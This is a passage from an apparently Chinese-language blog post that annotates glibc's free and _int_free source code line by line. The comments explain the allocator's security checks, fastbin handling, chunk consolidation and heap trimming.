memory. */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      mp_.mmap_threshold = chunksize(p);</span><br><span class="line">      mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">      LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                 mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//根据 chunk 指针获得分配区的指针，即 chunk 的管理块 arena，然后调用 _int_free() 函数执行实际的释放工作。</span></span><br><span class="line">  ar_ptr = arena_for_chunk(p);</span><br><span class="line">  _int_free(ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="int_free">_int_free</h4>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line">_int_free(mstate av, mchunkptr p, <span class="type">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;          <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;      <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize; <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> nextinuse;            <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize; <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;            <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;            <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="type">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  size = chunksize(p);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//首先进行一系列的安全检查。chunk 的指针地址不能溢出，chunk 的大小必须大于等于 MINSIZE。</span></span><br><span class="line">  <span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect((<span class="type">uintptr_t</span>)p &gt; (<span class="type">uintptr_t</span>)-size, <span class="number">0</span>) || __builtin_expect(misaligned_chunk(p), <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr(check_action, errstr, chunk2mem(p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check_inuse_chunk(av, p);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">    and used quickly in malloc.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//如果当前 free 的 chunk 属于 fast bins 且下一个 chunk 不是 top chunk，查看下一个相邻的 chunk 的大小是否小于等于 2*SIZE_SZ，且是否大于分配区，即检查下一个相邻 chunk 的大小有没有问题。</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">  If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">  bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">         of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">         after getting the lock.  */</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock || (&#123;</span><br><span class="line">            assert(locked == <span class="number">0</span>);</span><br><span class="line">            mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">1</span>;</span><br><span class="line">            chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      &#123;</span><br><span class="line">        (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置当前分配区的 fast bin flag，表示当前分配区的 fast bins 中已有空闲 chunk。然后根据当前 free 的 chunk 大小获取其所属的 fast bin 头指针。</span></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//检查 double free 的，即检查 fast bin 链头的 chunk 和要释放的 chunk 是否一致。</span></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">         (i.e., double free).  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//检查顶部 fastbin 块的大小是否与我们要添加的块的大小相同。</span></span><br><span class="line">      <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">         size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">         only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">         deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        old_idx = fastbin_index(chunksize(old));</span><br><span class="line">      p-&gt;fd = old2 = old;</span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  Consolidate other non-mmapped chunks as they arrive.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//当前还没有获得分配区的锁，获取分配区的锁。</span></span><br><span class="line">  <span class="keyword">if</span> (!have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//获取当前 free 的 chunk 的下一个相邻的 chunk。</span></span><br><span class="line">  nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//进行安全检查，当前 free 的 chunk 不能为 top chunk，因为 top chunk 为空闲 chunk，如果再次 free 就可能为 double free 错误了。</span></span><br><span class="line">  <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">     top block.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(p == av-&gt;top))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//如果当前 free 的 chunk 是通过 sbrk() 分配的，并且下一个相邻的 chunk 的地址已经超过了 top chunk 的结束地址，即超过了当前分配区的结束地址，报错。</span></span><br><span class="line">  <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(contiguous(av) &amp;&amp; (<span class="type">char</span> *)nextchunk &gt;= ((<span class="type">char</span> *)av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//如果当前 free 的 chunk 的下一个相邻 chunk 的 size 中标志位没有标识当前 free chunk 为 inuse 状态，可能为 double free 错误。</span></span><br><span class="line">  <span class="comment">//这就是为什么 fast bin 的 double free 这么容易利用，因为 chunk 被链入 fast bin 是不会将下一个 chunk 的 pre_inuse 位置 0 的。</span></span><br><span class="line">  <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely(!prev_inuse(nextchunk)))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//计算当前 free 的 chunk 的下一个相邻 chunk 的大小，该大小如果小于等于 2*SIZE_SZ 或是大于了分配区所分配区的内存总量，报错。</span></span><br><span class="line">  nextsize = chunksize(nextchunk);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">/* consolidate backward */</span></span><br><span class="line"><span class="comment">//如果当前 free 的 chunk 的前一个相邻 chunk 为空闲状态，与前一个空闲 chunk 合并。计算合并后的 chunk 大小，并将前一个相邻空闲 chunk 从空闲 chunk 链表中删除。</span></span><br><span class="line">   <span class="keyword">if</span> (!prev_inuse(p))</span><br><span class="line">   &#123;</span><br><span class="line">     prevsize = p-&gt;prev_size;</span><br><span class="line">     size += prevsize;</span><br><span class="line">     p = chunk_at_offset(p, -((<span class="type">long</span>)prevsize));</span><br><span class="line">     unlink(av, p, bck, fwd);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//如果与当前 free 的 chunk 相邻的下一个 chunk 不是分配区的 top chunk，查看与当前 chunk 相邻的下一个 chunk 是否处于 inuse 状态。如果与当前 free 的 chunk 相邻的下一个 chunk 处于 inuse 状态，清除当前 chunk 的 inuse 状态，则当前 chunk 空闲了。</span></span><br><span class="line"><span class="comment">//否则，将相邻的下一个空闲 chunk 从空闲链表中删除，并计算当前 chunk 与下一个 chunk 合并后的 chunk 大小。</span></span><br><span class="line">   <span class="keyword">if</span> (nextchunk != av-&gt;top)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">     nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* consolidate forward */</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse)</span><br><span class="line">     &#123;</span><br><span class="line">       unlink(av, nextchunk, bck, fwd);</span><br><span class="line">       size += nextsize;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">     <span class="comment">/*</span></span><br><span class="line"><span class="comment"> Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment"> not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment"> been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">     <span class="comment">//将合并后的 chunk 加入 unsorted bin 的双向循环链表中。如果合并后的 chunk 属于 large  bins，将 chunk 的 fd_nextsize 和 bk_nextsize 设置为 NULL，因为在 unsorted bin 中这两个字段无用。</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av);</span><br><span class="line">     fwd = bck-&gt;fd;</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">     &#123;</span><br><span class="line">       errstr = <span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">       <span class="keyword">goto</span> errout;</span><br><span class="line">     &#125;</span><br><span class="line">     p-&gt;fd = fwd;</span><br><span class="line">     p-&gt;bk = bck;</span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size))</span><br><span class="line">     &#123;</span><br><span class="line">       p-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">       p-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     bck-&gt;fd = p;</span><br><span class="line">     fwd-&gt;bk = p;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//设置合并后的空闲 chunk 大小，并标识前一个 chunk 处于 inuse 状态，因为必须保证不能有两个相邻的 chunk 都处于空闲状态。然后将合并后的 chunk 加入 unsorted bin 的双向循环链表中。最后设置合并后的空闲 chunk 的 foot，chunk 空闲时必须设置 foot，该 foot 处于下一个 chunk 的 prev_size 中，只有 chunk 空闲是 foot 才是有效的。</span></span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     set_foot(p, size);</span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">     consolidate into top</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果当前 free 的 chunk 下一个相邻的 chunk 为 top chunk，则将当前 chunk 合并入 top chunk，修改 top chunk 的大小。</span></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123;</span><br><span class="line">     size += nextsize;</span><br><span class="line">     set_head(p, size | PREV_INUSE);</span><br><span class="line">     av-&gt;top = p;</span><br><span class="line">     check_chunk(av, p);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If freeing a large space, consolidate possibly-surrounding</span></span><br><span class="line"><span class="comment">      chunks. Then, if the total unused topmost memory exceeds trim</span></span><br><span class="line"><span class="comment">      threshold, ask malloc_trim to reduce top.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      Unless max_fast is 0, we don&#x27;t know if there are fastbins</span></span><br><span class="line"><span class="comment">      bordering top, so we cannot tell for sure whether threshold</span></span><br><span class="line"><span class="comment">      has been reached unless fastbins are consolidated.  But we</span></span><br><span class="line"><span class="comment">      don&#x27;t want to consolidate on each free.  As a compromise,</span></span><br><span class="line"><span class="comment">      consolidation is performed if FASTBIN_CONSOLIDATION_THRESHOLD</span></span><br><span class="line"><span class="comment">      is reached.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果合并后的 chunk 大小大于 64KB(0x10000)，并且 fast bins 中存在空闲 chunk，调用 malloc_consolidate() 函数合并 fast bins 中的空闲 chunk 到 unsorted bin 中。</span></span><br><span class="line">	<span class="comment">//这里也很重要，就是判断得到的 unsorted bin size 是否大于 FASTBIN_CONSOLIDATION_THRESHOLD，就会触发 malloc_consolidate。</span></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= FASTBIN_CONSOLIDATION_THRESHOLD)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">        malloc_consolidate(av);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//如果当前分配区为主分配区，并且 top chunk 的大小大于 heap 的收缩阈值，调用 systrim() 函数收缩 heap。</span></span><br><span class="line">      <span class="keyword">if</span> (av == &amp;main_arena)</span><br><span class="line">      &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MORECORE_CANNOT_TRIM</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(chunksize(av-&gt;top)) &gt;=</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span>)(mp_.trim_threshold))</span><br><span class="line">          systrim(mp_.top_pad, av);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//如果为非主分配区，调用 heap_trim()函数收缩非主分配区的 sub_heap。</span></span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* Always try heap_trim(), even if the top chunk is not</span></span><br><span class="line"><span class="comment">           large, because the corresponding heap might go away.  */</span></span><br><span class="line">        heap_info *heap = heap_for_ptr(top(av));</span><br><span class="line"></span><br><span class="line">        assert(heap-&gt;ar_ptr == av);</span><br><span class="line">        heap_trim(heap, mp_.top_pad);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果获得了分配区的锁，则对分配区解锁。</span></span><br><span class="line">    <span class="keyword">if</span> (!have_lock)</span><br><span class="line">    &#123;</span><br><span class="line">      assert(locked);</span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the chunk was allocated via mmap, release via munmap().</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="comment">//如果当前 free 的 chunk 是通过 mmap()分配的，调用 munma_chunk()释放内存。</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    munmap_chunk(p);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="unlink-1">unlink</h4>
